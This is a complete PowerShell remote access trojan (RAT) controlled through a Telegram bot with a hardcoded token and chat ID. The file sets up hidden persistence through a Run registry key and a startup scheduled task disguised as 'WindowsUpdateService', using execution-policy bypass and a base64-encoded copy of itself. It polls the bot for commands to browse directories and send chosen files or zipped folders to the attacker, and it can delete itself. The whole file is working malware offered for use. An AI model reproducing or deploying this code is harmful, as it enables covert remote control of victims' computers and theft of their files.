function Encode-String {
    param([string]$String)
    return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($String))
}

function Decode-String {
    param([string]$String)
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
}

$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"
$CurrentPath = $pwd.Path
$BotURL = "https://api.telegram.org/bot$Token/"

$ScriptPath = $MyInvocation.MyCommand.Path
$TaskName = "WindowsUpdateService"
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

function Send-Telegram {
    param([string]$Text, [string]$FilePath = $null)
    
    try {
        if ($FilePath -and (Test-Path $FilePath)) {
            $FileForm = @{
                chat_id = $ChatID
                document = Get-Item -Path $FilePath
            }
            Invoke-RestMethod -Uri ($BotURL + "sendDocument") -Method Post -Form $FileForm
        } else {
            $Body = @{
                chat_id = $ChatID
                text = $Text
                parse_mode = "HTML"
            }
            Invoke-RestMethod -Uri ($BotURL + "sendMessage") -Method Post -Body $Body
        }
    } catch { }
}

function Compress-Folder {
    param([string]$FolderPath)
    $TempZip = "$env:TEMP\$([System.Guid]::NewGuid().ToString()).zip"
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $TempZip)
        return $TempZip
    } catch {
        return $null
    }
}

function Remove-Persistence {
    Remove-ItemProperty -Path $RegPath -Name $TaskName -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
}

function SelfDestruct {
    Remove-Persistence
    if ($ScriptPath -and (Test-Path $ScriptPath)) {
        Remove-Item $ScriptPath -Force
    }
    exit
}

function Install-Persistence {
    $EncodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content $ScriptPath -Raw)))
    $Payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $EncodedScript"
    
    Set-ItemProperty -Path $RegPath -Name $TaskName -Value $Payload -ErrorAction SilentlyContinue
    
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
}

function Process-Command {
    param([string]$Command, [string]$Args = "")
    
    switch ($Command) {
        "/help" {
            $HelpText = @"
Available commands:
/help - Show this help
/ls [path] - List directory contents
/cd [path] - Change directory
/download [path] - Download file or folder
/selfdestruct - Remove RAT and persistence
"@
            Send-Telegram -Text $HelpText
        }
        "/ls" {
            $TargetPath = if ($Args) { $Args } else { $CurrentPath }
            try {
                $Items = Get-ChildItem -Path $TargetPath -Force | Select-Object Name, Length, LastWriteTime
                $Result = $Items | ForEach-Object { 
                    $Type = if ($_.PSIsContainer) { "DIR" } else { "FILE" }
                    "$Type - $($_.Name) - $($_.Length) bytes - $($_.LastWriteTime)"
                }
                Send-Telegram -Text ($Result -join "`n")
            } catch {
                Send-Telegram -Text "Error listing directory"
            }
        }
        "/cd" {
            if ($Args) {
                try {
                    Set-Location $Args
                    $CurrentPath = $pwd.Path
                    Send-Telegram -Text "Directory changed to: $CurrentPath"
                } catch {
                    Send-Telegram -Text "Error changing directory"
                }
            }
        }
        "/download" {
            if ($Args -and (Test-Path $Args)) {
                $Item = Get-Item $Args
                if ($item.PSIsContainer) {
                    $ZipPath = Compress-Folder -FolderPath $Args
                    if ($ZipPath) {
                        Send-Telegram -Text "Folder compressed" -FilePath $ZipPath
                        Remove-Item $ZipPath -Force
                    }
                } else {
                    Send-Telegram -Text "File download" -FilePath $Args
                }
            }
        }
        "/selfdestruct" {
            Send-Telegram -Text "Self destruction initiated"
            SelfDestruct
        }
    }
}

try {
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        Install-Persistence
        Send-Telegram -Text "System initialized - use /help for commands"
    }

    while ($true) {
        try {
            $Updates = Invoke-RestMethod -Uri ($BotURL + "getUpdates") -Method Get
            if ($Updates.ok -and $Updates.result) {
                foreach ($Update in $Updates.result) {
                    $Message = $Update.message
                    if ($Message -and $Message.chat.id -eq [int64]$ChatID) {
                        $Text = $Message.text
                        if ($Text) {
                            $Parts = $Text -split " ", 2
                            $Command = $Parts[0]
                            $Args = if ($Parts.Count -gt 1) { $Parts[1] } else { "" }
                            Process-Command -Command $Command -Args $Args
                        }
                    }
                }
            }
        } catch { }
        Start-Sleep -Seconds 5
    }
} catch {
    Start-Sleep -Seconds 60
}
